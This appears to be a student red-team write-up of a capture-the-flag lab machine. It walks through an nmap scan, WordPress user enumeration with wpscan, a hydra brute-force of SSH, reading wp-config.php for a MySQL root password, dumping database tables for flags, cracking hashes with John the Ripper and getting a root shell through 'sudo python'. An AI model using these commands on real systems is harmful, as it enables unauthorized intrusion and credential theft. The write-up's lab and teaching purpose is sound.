# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sv 192.168.1.0/24
```
![](https://github.com/Nhiwins/Final-Project/blob/main/Images/nmap.PNG)

This scan identifies the services below as potential points of entry:
- Target 1 (192.168.1.110)
  - Port 22 ssh
  - Port 80 http
  - Port 111 rpcbind
  - Port 139 netbios-ssn
  - Port 445 netbios-ssn

The following vulnerabilities were identified on each target:
- Target 1
  - Weak User Password (High Severity)
  - User Enumeration (Medium Severity)
  - User Privelege Escalation (High Severity)

### Exploitation

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:
- Target 1
  - `flag1`: b9bbcb33e11b80be759c4e844862482d
    - Users were enumerated with wpscan, Brute Force attack against weak password, then I exploited open port 22
      - wpscan was used to enumerate the users on Target 1
      - Command: `$ wpscan --url http://192.168.1.110/wordpress --enumerate u`
![](https://github.com/Nhiwins/Final-Project/blob/main/Images/wpscan.PNG)
   - User michael was targeted
   - Used hydra to brute force `$ hydra -l michael -p /usr/share/wordlists/dirb`
   - Capturing the first flag:
      - `ssh michael@192.168.1.110`
      - `cd /var/www/html`
      - `grep -ir flag1`

![](https://github.com/Nhiwins/Final-Project/blob/main/Images/flag1.PNG)
      
  - `flag2`: fc3fd58dcdad9ab23faca6e9a3e581c
    - The same process was used, but I used these commands:
      - `cd /var/www`
      - `ls' found flag2.txt

![](https://github.com/Nhiwins/Final-Project/blob/main/Images/flag2.PNG)

  - `flag3`: afc01ab56b50591e7dccf93122770cd2 and `flag4`: 715dea6c055b9fe3337544932f2941ce
    - To find MySql database login information, this command was used: `cat /var/www/html/wordpress/wp-config.php`

![](https://github.com/Nhiwins/Final-Project/blob/main/Images/mysql%20pword.PNG)
 
    - MySql was were flag3 and flag4 were found using these commands:
      - `mysql -u root -p'R@venSecurity'`
      - `SHOW DATABASES;`
      - `USE wordpress;`
      - `SHOW tables;`
      - `SELECT * FROM wp_posts;`
      
![](https://github.com/Nhiwins/Final-Project/blob/main/Images/flag3%20and%204.PNG)

  -Additionally, hashes for each user was found, and privelege escalation was exploited.
  
![](https://github.com/Nhiwins/Final-Project/blob/main/Images/mysql%20hashes.PNG)

    - I created a file with the hashes and used John the Ripper to crack them
      - `john hashes.txt -wordlist=/usr/share/wordlists/dirb/big.txt`
    - From there, I connected to Steven's account and open a python shell with root privelege
      - ssh steven@192.168.1.110
      - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
![](https://github.com/Nhiwins/Final-Project/blob/main/Images/last%20photo.PNG)
